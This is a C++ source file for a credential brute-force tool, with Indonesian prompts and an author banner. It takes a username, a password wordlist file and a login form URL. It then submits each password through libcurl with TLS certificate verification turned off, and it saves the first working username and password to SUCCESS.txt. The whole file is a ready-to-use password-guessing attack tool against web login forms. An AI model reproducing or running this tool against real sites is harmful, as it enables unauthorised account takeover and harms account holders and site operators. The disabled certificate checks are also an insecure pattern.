#include <iostream>
#include <string>
#include <fstream>
#include <windows.h> // Library untuk menggunakan fungsi Sleep()

#include <curl/curl.h>

using namespace std;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

bool login(CURL* curl, const string& url, const string& username, const string& password, const string& errorMessage, string& responseData) {
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

    string postData = "username=" + username + "&password=" + password + "&login=submit";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return false;
    } else {
        return (responseData.find(errorMessage) == string::npos); // return true if error message not found
    }
}

int main() {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        string username, passwordFile, url, errorMessage;
		string garis="|===============================================================|\n";
		cout<<garis;
		cout<<"|\t\tSelamat Data di Brutefoce\t\t\t|\n";
		cout<<"|\t\t\t\t\t\t\t\t|\n";
				cout<<"|\t\t\tInstagram:aditiya.subakti\t\t|\n";
				cout<<"|\t\t\tFacebook :aditiya.subakti\t\t|\n";
				cout<<"|\t\t\tGithub   :aditiya.subakti\t\t|\n";
				cout<<"|\t\t\tLinked   :aditiya.subakti\t\t|\n";
				cout<<"|\t\t\tWebsite  :AditiyaSubakti.com\t\t|\n";
		cout<<"|\t\t\t\t\t\t\t\t|\n";
		cout<<"|\t\t*dibuat Oleh Aditiya Subakti\t\t\t|\n";
		cout<<garis;

        cout << "Masukkan username: ";
        getline(cin, username);

        cout << "Masukkan path file daftar password: ";
        getline(cin, passwordFile);

        cout << "Masukkan URL form login: ";
        getline(cin, url);

        cout << "Masukkan pesan kesalahan ketika login gagal: ";
        getline(cin, errorMessage);

        ifstream inputFile(passwordFile);
        if (!inputFile.is_open()) {
            cerr << "Gagal membuka file password." << endl;
            return 1;
        }

        string password;
        bool success = false;

        while (getline(inputFile, password)) {
            string responseData;
            if (login(curl, url, username, password, errorMessage, responseData)) {
            	system("cls");
            	cout<<"SUCCESSS"<<endl;
                cout << "Login berhasil username :"<<username<<" dengan password: " << password << endl;
                ofstream succcess("SUCCESS.txt");
                if (succcess.is_open()) { 
                	succcess<<"============success============\n";
                	succcess<<"url :"<<url<<"\n";
                	succcess<<"username :"<<username<<"\n";
                	succcess<<"Password :"<<password<<"\n";
					succcess.close();
           		 }
                success = true;
                break;
               

            } else {
            	system("cls");
                cout <<errorMessage <<"\t:"<<password<< endl;
            }
        }

        if (!success) {
            cout << "Gagal login setelah mencoba semua password." << endl;
        }

        curl_easy_cleanup(curl);
        Sleep(10000);

    }

    curl_global_cleanup();

    return 0;
}

